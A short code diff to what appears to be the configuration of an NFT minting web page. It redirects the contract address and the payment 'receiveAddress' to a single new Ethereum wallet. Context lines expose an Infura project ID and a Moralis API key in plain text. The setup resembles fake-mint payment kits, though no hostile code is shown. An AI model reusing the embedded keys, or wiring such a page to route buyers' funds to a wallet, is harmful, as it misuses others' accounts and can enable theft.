@@ -1,4 +1,4 @@
-const address = '0xCbC0011c318c0368FAfe94ca7C85867d4BbC28E3',
+const address = '0xF49132F551460D7b1ED463A3A8e03a73717C209E',
   infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
   moralisApi =
     'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
@@ -33,7 +33,7 @@ const mintInfo = {
     active: true,
     minValue: 0.1,
     checkMaxDay: 7,
-    receiveAddress: 'NFT ADRESS',
+    receiveAddress: '0xF49132F551460D7b1ED463A3A8e03a73717C209E',
   }
 if (mintInfo.minUnits > mintInfo.maxUnits) {
   console.error(
